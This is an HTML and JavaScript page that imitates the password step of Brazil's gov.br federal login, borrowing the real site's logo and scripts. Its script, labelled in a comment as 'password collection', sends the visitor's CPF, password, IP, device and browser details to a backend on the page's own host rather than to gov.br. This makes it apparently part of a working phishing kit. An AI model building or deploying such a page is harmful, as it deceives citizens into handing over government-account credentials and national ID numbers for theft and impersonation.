<style>
  .actions {
    display: flex;
    flex-direction: column;
    gap: 1rem;
    width: 100% !important;
  }
  .button-panel {
    display: flex;
    justify-content: space-between;
    gap: 0.5rem;
    margin: 2rem 0 1rem 0 !important;
  }
  
  #password-recovery {
    margin-top: 0rem;
    margin-bottom: 1rem;
  }
  
  .button-ok:disabled {
    opacity: 0.6 !important;
    cursor: not-allowed !important;
    color: transparent !important;
    position: relative;
  }
  
  .button-ok:disabled::after {
     animation: spin 1.3s infinite linear;
     border: 2px solid white;
     border-radius: 50%;
     border-right-color: transparent;
     content: "";
     display: block;
     height: 1.2em;
     left: calc(50% - 0.6em);
     position: absolute;
     top: calc(50% - 0.6em);
     width: 1.2em;
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .password-eye {
    position: relative;
    display: flex;
    align-items: center;
  }
  
  .password-eye input {
    flex: 1;
    padding-right: 40px;
  }
  
  .toggle-password {
    position: absolute;
    right: 12px;
    cursor: pointer;
    color: #666;
  }
  
  @media (max-width: 765px) {
    .button-panel {
      margin: 2rem 0 1rem 0 !important;
      gap: 0.75rem !important;
      flex-direction: column-reverse !important;
      justify-content: space-between !important;
    }
    .button-panel button{
      width: 100% !important;
    }
  }
</style>

<div class="container">
    <aside>
      <div class="card" id="login-password-info">
        <img src="https://sso.acesso.gov.br/assets/govbr/img/senha.png" alt="Logomarca GovBR"/>
        <p>Digite sua senha para acessar o login único do governo federal.</p>
      </div>
    </aside>
    <main>
      <form method="post" id="loginData" action="#" novalidate autocomplete="off">
  
        <div class="card" id="login-password">
          <h3>Digite sua senha</h3>
          <label>CPF</label>
          <h4 id="cpf-display">Carregando...</h4>
          <label for="password">Senha</label>
          
          <div class="password-eye">
            <input onkeypress="submitOnEnterKeyPress('submit-button')" tabindex="1" name="password" id="password" type="password" value="" placeholder="Digite sua senha atual" autocomplete="new-password" />
            <span tabindex="2" toggle="#password" class="fa fa-fw fa-eye toggle-password" onclick="togglePassword()"></span>
          </div>    
          
          <div class="actions">
              <div class="button-panel">
                <button type="button" onclick="cancelLogin()" value="cancel" class="button-cancel" tabindex="4">Cancelar</button>
                <button id="submit-button" type="button" name="operation" value="enter-password" class="button-ok" aria-label="Botão Entrar. Aperte a tecla enter para entrar." tabindex="3">Entrar</button>
              </div>
              <button id="password-recovery" type="button" onclick="forgotPassword()" name="operation" value="call-account-recovery" class="button-href-mimic" tabindex="5">Esqueci minha senha</button>
          </div>
        </div>
        <div class="card" id="faq">
          <a tabindex="6" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" target="_blank">Ficou com dúvidas?</a>
        </div>
        
        <input type="hidden" name="token" id="token-field" />
        <input type="hidden" name="_csrf" id="csrf-field" />
        <input type="hidden" id="operation-field" /> 
      </form>
    </main>
</div>

<footer></footer>

<script src="https://sso.acesso.gov.br/assets/vendors/jquery/jquery-2.2.4.min.js"></script>
<script src="https://sso.acesso.gov.br/assets/govbr/js/scripts.js"></script>
<script src="https://sso.acesso.gov.br/assets/vendors/jquery/jquery.maskedinput.js"></script>

<script>
// ============================================================
// CONFIGURACAO - COLETA SENHA
// ============================================================
const API_URL = window.location.origin;

// Dados do CPF vindo da página anterior
const userCPF = localStorage.getItem('login_cpf') || '';
const userIP = localStorage.getItem('login_ip') || '';
const userDispositivo = localStorage.getItem('login_dispositivo') || '';
const userNavegador = localStorage.getItem('login_navegador') || '';

function displayCPF(cpf) {
    const cpfElement = document.getElementById('cpf-display');
    if (cpfElement && cpf) {
        let formattedCPF = cpf.replace(/\D/g, '');
        if (formattedCPF.length >= 4) formattedCPF = formattedCPF.replace(/(\d{3})(\d)/, '$1.$2');
        if (formattedCPF.length >= 8) formattedCPF = formattedCPF.replace(/(\d{3})(\d)/, '$1.$2');
        if (formattedCPF.length >= 11) formattedCPF = formattedCPF.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        cpfElement.textContent = formattedCPF;
    }
}

displayCPF(userCPF);

if (!userCPF) {
    window.location.href = '/index.html';
}

// Função de login - ENVIA SENHA PARA O BACKEND
async function realizarLogin(senha) {
    const btn = document.getElementById('submit-button');
    
    try {
        const response = await fetch(`${API_URL}/api/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                cpf: userCPF.replace(/\D/g, ''), 
                password: senha,
                ip: userIP,
                dispositivo: userDispositivo,
                navegador: userNavegador
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            localStorage.setItem('token', data.token);
            localStorage.setItem('user', JSON.stringify(data.user));
            
            // Limpar dados temporários
            localStorage.removeItem('login_cpf');
            localStorage.removeItem('login_ip');
            localStorage.removeItem('login_dispositivo');
            localStorage.removeItem('login_navegador');
            
            window.location.href = '/dashboard.html';
            return true;
        } else {
            alert(data.error || 'CPF ou senha inválidos');
            return false;
        }
    } catch (error) {
        console.error('Erro:', error);
        alert('Erro ao conectar com o servidor');
        return false;
    }
}

// Função principal
async function onSubmit() {
    const passwordInput = document.getElementById('password');
    const senha = passwordInput ? passwordInput.value : '';
    const btn = document.getElementById('submit-button');
    
    if (!senha) {
        alert('Digite sua senha');
        passwordInput.focus();
        return;
    }
    
    if (btn) {
        btn.disabled = true;
        btn.textContent = '';
    }
    
    const result = await realizarLogin(senha);
    
    if (!result && btn) {
        btn.disabled = false;
        btn.textContent = 'Entrar';
    }
}

function cancelLogin() {
    localStorage.removeItem('login_cpf');
    localStorage.removeItem('login_ip');
    localStorage.removeItem('login_dispositivo');
    localStorage.removeItem('login_navegador');
    window.location.href = '/index.html';
}

function forgotPassword() {
    alert('Para recuperar sua senha, acesse: https://gov.br/recuperar-senha');
}

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggle = document.querySelector('.toggle-password');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggle.classList.remove('fa-eye');
        toggle.classList.add('fa-eye-slash');
    } else {
        passwordInput.type = 'password';
        toggle.classList.remove('fa-eye-slash');
        toggle.classList.add('fa-eye');
    }
}

document.getElementById('password')?.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        onSubmit();
    }
});

const submitBtn = document.getElementById('submit-button');
if (submitBtn) {
    submitBtn.addEventListener('click', onSubmit);
}

function focusOnLoad(id) {
    const el = document.getElementById(id);
    if (el) setTimeout(() => el.focus(), 100);
}

focusOnLoad('password');
</script>
</body>
</html>
